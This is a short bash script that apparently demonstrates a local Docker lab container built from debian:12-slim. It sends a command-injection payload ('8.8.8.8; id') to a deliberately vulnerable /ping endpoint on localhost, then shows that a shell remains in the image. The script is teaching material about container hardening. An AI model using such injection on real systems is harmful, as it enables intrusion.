#!/usr/bin/env bash
# Run from inside the 04-demo-debian-slim/ folder.
# Build: docker build -f Dockerfile -t 04-demo-debian-slim ..
# Run:   docker run -d --name 04-demo-debian-slim -p 5004:5000 04-demo-debian-slim

set -euo pipefail

TARGET="http://localhost:5004"
sep() { echo; echo "─────────────────────────────────────────────"; }

sep
echo "STEP 1: Package count -- same as full debian:12 (slim strips docs, not packages)"
docker exec 04-demo-debian-slim dpkg -l | wc -l

sep
echo "STEP 2: Normal ping"
curl -s "$TARGET/ping?host=8.8.8.8" | python3 -m json.tool

sep
echo "STEP 3: Exploit -- command injection"
echo "        Payload: ?host=8.8.8.8; id"
curl -s "$TARGET/ping?host=8.8.8.8%3B+id" | python3 -m json.tool

sep
echo "STEP 4: Shell present"
docker exec 04-demo-debian-slim ls -la /bin/sh

sep
echo "STEP 5: Drop into a shell"
docker exec -it 04-demo-debian-slim /bin/bash
